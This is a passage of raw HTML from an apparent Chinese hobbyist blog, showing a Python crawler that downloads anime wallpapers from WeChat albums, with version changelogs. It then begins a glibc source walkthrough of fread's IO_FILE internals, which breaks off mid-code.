class="line">        response = image.attrs[<span class="string">&quot;data-src&quot;</span>]</span><br><span class="line">        num = name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        dtype = response.split(<span class="string">&#x27;=&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        num += <span class="string">&#x27;.&#x27;</span> + dtype</span><br><span class="line">        response = req.get(response)</span><br><span class="line">        os.makedirs(name, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name+ <span class="string">&#x27;/&#x27;</span> +num, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;exit~~~~bye~~~~&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">bsObj=GetURL()</span><br><span class="line">images=Getimage(bsObj)</span><br><span class="line">name=GetName(bsObj)</span><br><span class="line">Download(images,name)</span><br><span class="line">More()</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v1.1</li>
<li>date：2022.4.2</li>
<li>type：<ul>
<li>Features：Download完毕以后可以选择继续Download，可以索引部分内部链接用于Download，加强了爬虫的互动性</li>
<li>Changed：NULL</li>
<li>Removed：删除了输入文件名的操作</li>
</ul>
</li>
<li>desc：<ul>
<li>功能有些许加强，但没有质变</li>
</ul>
</li>
</ul>
<h2 id="爬虫小子-V1-2"><a href="#爬虫小子-V1-2" class="headerlink" title="爬虫小子_V1.2"></a>爬虫小子_V1.2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetNextURL</span>(<span class="params">target</span>):</span></span><br><span class="line">    html = urlopen(target)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    name = GetName(bsObj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The next one is &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> bsObj</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetAllURL</span>():</span></span><br><span class="line">    target = <span class="string">&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUzNjA0MjkxMw==&amp;action=getalbum&amp;album_id=2119868775733706753&amp;scene=173&amp;from_msgid=2247561088&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect&quot;</span></span><br><span class="line">    html = urlopen(target)</span><br><span class="line">    bsObj = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    link_list = GetLinks(bsObj)</span><br><span class="line">    <span class="keyword">return</span> link_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Getimage</span>(<span class="params">bsObj</span>):</span></span><br><span class="line">    images = bsObj.findAll(<span class="string">&quot;img&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_pages wxw-img&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> images</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetName</span>(<span class="params">bsObj</span>):</span></span><br><span class="line">    title = bsObj.find(<span class="string">&quot;h1&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_media_title&quot;</span>&#125;)</span><br><span class="line">    name = <span class="string">&quot;image-&quot;</span> + title.string.split(<span class="string">&#x27;【二次元壁纸分享】&#x27;</span>)[-<span class="number">1</span>][:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLinks</span>(<span class="params">bsObj</span>):</span></span><br><span class="line">    links = bsObj.findAll(<span class="string">&quot;li&quot;</span>,&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;album__list-item js_album_item js_wx_tap_highlight wx_tap_cell&quot;</span>&#125;)</span><br><span class="line">    link_list = []</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;data-link&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;data-link&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> link_list:</span><br><span class="line">                link_list.append(link.attrs[<span class="string">&#x27;data-link&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> link_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DownloadApart</span>(<span class="params">images,name</span>):</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;finish！！！, now you get &quot;</span> + <span class="built_in">str</span>(n) + <span class="string">&quot; images&quot;</span>)</span><br><span class="line">        response = image.attrs[<span class="string">&quot;data-src&quot;</span>]</span><br><span class="line">        num = name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        dtype = response.split(<span class="string">&#x27;=&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        num += <span class="string">&#x27;.&#x27;</span> + dtype</span><br><span class="line">        response = req.get(response)</span><br><span class="line">        os.makedirs(name, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name+ <span class="string">&#x27;/&#x27;</span> +num, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DownloadTogether</span>(<span class="params">images,name</span>):</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;finish！！！, now you get &quot;</span> + <span class="built_in">str</span>(n) + <span class="string">&quot; images&quot;</span>)</span><br><span class="line">        response = image.attrs[<span class="string">&quot;data-src&quot;</span>]</span><br><span class="line">        num = name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        dtype = response.split(<span class="string">&#x27;=&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        num += <span class="string">&#x27;.&#x27;</span> + dtype</span><br><span class="line">        response = req.get(response)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(num, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Do you want to Together or Apart?&quot;</span>)</span><br><span class="line">choice = <span class="built_in">input</span>(<span class="string">&quot;Please input &#x27;t&#x27; for Together &#x27;a&#x27; for Apart\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">link_list = GetAllURL()</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> link_list:</span><br><span class="line">    bsObj = GetNextURL(link)</span><br><span class="line">    images = Getimage(bsObj)</span><br><span class="line">    name = GetName(bsObj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;t&quot;</span>:</span><br><span class="line">        DownloadTogether(images,name)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">        DownloadApart(images,name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong choice~~~~&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All images finish!!!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
<img src="/2022/03/31/%E7%88%AC%E8%99%AB%E5%B0%8F%E5%AD%90%EF%BC%9A%E4%BA%8C%E6%AC%A1%E5%85%83%E7%9A%84%E7%A6%8F%E9%9F%B3/1648911316311-1649782993246-1652928096406.png" class width="1648911316311"> 
<img src="/2022/03/31/%E7%88%AC%E8%99%AB%E5%B0%8F%E5%AD%90%EF%BC%9A%E4%BA%8C%E6%AC%A1%E5%85%83%E7%9A%84%E7%A6%8F%E9%9F%B3/1648911304749-1649782993249-1652928096410.png" class width="1648911304749"> 
<p>一口气干了 181 张，可以可以……</p>
<p>更新日志：</p>
<ul>
<li>version：v1.2</li>
<li>date：2022.4.2</li>
<li>type：<ul>
<li>Features：可以选择把图片分开进行存储或者统一存储</li>
<li>Changed：改变了设计思路，点开即使用，不需要过多的操作</li>
<li>Removed：删除了大量的控制操作</li>
</ul>
</li>
<li>desc：<ul>
<li>v1.1 的变种，旨在快速获取大量图片，减少操作频率，但程序也因此不可控制，会重复Download相同的图片</li>
<li>有时需要手动调整输出文件的目录</li>
</ul>
</li>
</ul>
<h2 id="爬虫小子-V1-3"><a href="#爬虫小子-V1-3" class="headerlink" title="爬虫小子_V1.3"></a>爬虫小子_V1.3</h2><p>桌宠特供版，对代码进行了优化，并把函数用类组织起来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.stop = <span class="number">0</span></span><br><span class="line">        self.n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetNextURL</span>(<span class="params">self,target</span>):</span></span><br><span class="line">        self.html = urlopen(target)</span><br><span class="line">        self.bsObj = BeautifulSoup(self.html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        self.name = self.GetName(self.bsObj)</span><br><span class="line">        <span class="keyword">if</span> self.name == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something wrong...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The next one is &quot;</span> + self.name)</span><br><span class="line">        <span class="keyword">return</span> self.bsObj</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetAllURL</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#self.target = &quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUzNjA0MjkxMw==&amp;action=getalbum&amp;album_id=2119868775733706753&amp;scene=173&amp;from_msgid=2247561088&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect&quot;</span></span><br><span class="line">        self.target = <span class="string">&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUzNjA0MjkxMw==&amp;action=getalbum&amp;album_id=2342983337092759553&amp;scene=173&amp;from_msgid=2247561474&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect&quot;</span></span><br><span class="line">        self.html = urlopen(self.target)</span><br><span class="line">        self.bsObj = BeautifulSoup(self.html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        self.link_list = self.GetLinks(self.bsObj)</span><br><span class="line">        <span class="keyword">return</span> self.link_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Getimage</span>(<span class="params">self,bsObj</span>):</span></span><br><span class="line">        self.images = bsObj.findAll(<span class="string">&quot;img&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_pages wxw-img&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> self.images</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span>(<span class="params">self,bsObj</span>):</span></span><br><span class="line">        self.title = bsObj.find(<span class="string">&quot;h1&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;rich_media_title&quot;</span>&#125;)</span><br><span class="line">        self.name = self.title.string.split(<span class="string">&#x27;【二次元动漫壁纸】&#x27;</span>)[-<span class="number">1</span>][:<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> self.name.isdigit():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;image-&quot;</span> + self.name</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.ame = self.title.string.split(<span class="string">&#x27;【二次元壁纸分享】&#x27;</span>)[-<span class="number">1</span>][:<span class="number">3</span>]</span><br><span class="line">            <span class="keyword">if</span> self.name.isdigit():</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;image-&quot;</span> + self.name</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetLinks</span>(<span class="params">self,bsObj</span>):</span></span><br><span class="line">        self.links = bsObj.findAll(<span class="string">&quot;li&quot;</span>,&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;album__list-item js_album_item js_wx_tap_highlight wx_tap_cell&quot;</span>&#125;)</span><br><span class="line">        self.link_list = []</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> self.links:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;data-link&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> link.attrs[<span class="string">&#x27;data-link&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> self.link_list:</span><br><span class="line">                    self.link_list.append(link.attrs[<span class="string">&#x27;data-link&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> self.link_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DownloadTogether</span>(<span class="params">self,images,name</span>):</span></span><br><span class="line">        self.i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">            self.i += <span class="number">1</span></span><br><span class="line">            self.n += <span class="number">1</span></span><br><span class="line">            self.response = image.attrs[<span class="string">&quot;data-src&quot;</span>]</span><br><span class="line">            self. num = name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(self.i)</span><br><span class="line">            self.dtype = self.response.split(<span class="string">&#x27;=&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">            self.num += <span class="string">&#x27;.&#x27;</span> + self.dtype</span><br><span class="line">            self.response = req.get(self.response)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;finish！！！, now you get &quot;</span> + <span class="built_in">str</span>(self.n) + <span class="string">&quot; =&gt; &quot;</span>+self.num)</span><br><span class="line">            self.path = os.path.join(<span class="string">&quot;D:\\PythonProject\\Images&quot;</span>,self.num)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.path, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">                f.write(self.response.content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Start</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.link_list = self.GetAllURL()</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> self.link_list:</span><br><span class="line">            <span class="keyword">if</span> self.stop == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK quit....&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            self.bsObj = self.GetNextURL(link)</span><br><span class="line">            self.images = self.Getimage(self.bsObj)</span><br><span class="line">            self.name = self.GetName(self.bsObj)</span><br><span class="line">            <span class="keyword">if</span> self.name != <span class="literal">None</span>:</span><br><span class="line">                self.DownloadTogether(self.images,self.name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Stop</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.stop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    crawler = Crawler()</span><br><span class="line">    crawler.Start()</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v1.3</li>
<li>date：2022.5.14</li>
<li>type：<ul>
<li>Features：<ul>
<li>用类对函数进行了组织</li>
<li>添加了 Stop 功能</li>
<li>修了一些 BUG</li>
</ul>
</li>
<li>Changed：<ul>
<li>固定了文件保存的路径（用绝对路径写死）</li>
</ul>
</li>
<li>Removed：<ul>
<li>删除了分离储存，现在只能进行统一存储</li>
</ul>
</li>
</ul>
</li>
<li>desc：<ul>
<li>这款爬虫是为桌宠准备的，在功能上几乎没有提升（甚至还有阉割）</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afread/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/31/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afread/" class="post-title-link" itemprop="url">IO_FILE源码分析：fread</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-31 01:08:54 / Modified: 01:10:08" itemprop="dateCreated datePublished" datetime="2022-03-31T01:08:54+08:00">2022-03-31</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：fread"><a href="#IO-FILE源码分析：fread" class="headerlink" title="IO_FILE源码分析：fread"></a>IO_FILE源码分析：fread</h2><p>但程序从键盘读入数据时，程序会先把数据存储到“输入缓存区”中</p>
<p>直接上源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, size, count, fp)</span><br><span class="line">     <span class="keyword">void</span> *buf;</span><br><span class="line">     _IO_size_t size;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>); <span class="comment">/* 简单检查 */</span></span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_cleanup_region_start ((<span class="keyword">void</span> (*) __P ((<span class="keyword">void</span> *))) _IO_funlockfile, fp);</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested); <span class="comment">/* 核心 */</span></span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_IO_fread 函数的功能主要由 _IO_sgetn 函数实现，其他函数都是辅助功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进 _IO_XSGETN 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">register</span> _IO_size_t want, have;</span><br><span class="line">  <span class="keyword">register</span> _IO_ssize_t count;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">char</span> *s = data; <span class="comment">/* 指向需要装入数据的目标变量 */</span></span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) <span class="comment">/* 输入缓冲区未建立时 